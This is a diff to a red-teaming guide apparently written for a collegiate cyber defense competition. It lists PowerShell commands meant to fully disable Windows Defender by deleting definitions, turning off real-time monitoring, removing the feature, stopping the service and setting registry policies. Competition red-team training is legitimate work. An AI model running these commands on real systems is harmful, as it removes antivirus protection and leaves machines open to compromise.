@@ -181,7 +181,7 @@ pagetitle: Red Teaming for CCDC
   - Just run all of these in powershell and defender should be lobotomized by the end:
     - `'C:\Program Files\Windows Defender\MpCmdRun.exe' -RemoveDefinitions -All`
     - `Set-MpPreference -DisableRealtimeMonitoring $true`
-    - `Remove-WindowsFeature Windows-Defender, Windows-Defender-GUI`
+    - `Remove-WindowsFeature Windows-Defender`
     - `Stop-Service WinDefend -Force`
     - `Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableAntiSpyware" -Value 1 -Type DWord -Force`
     - `Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Policy Manager" -Name "AllowAntivirus" -Value 0 -Type DWord`
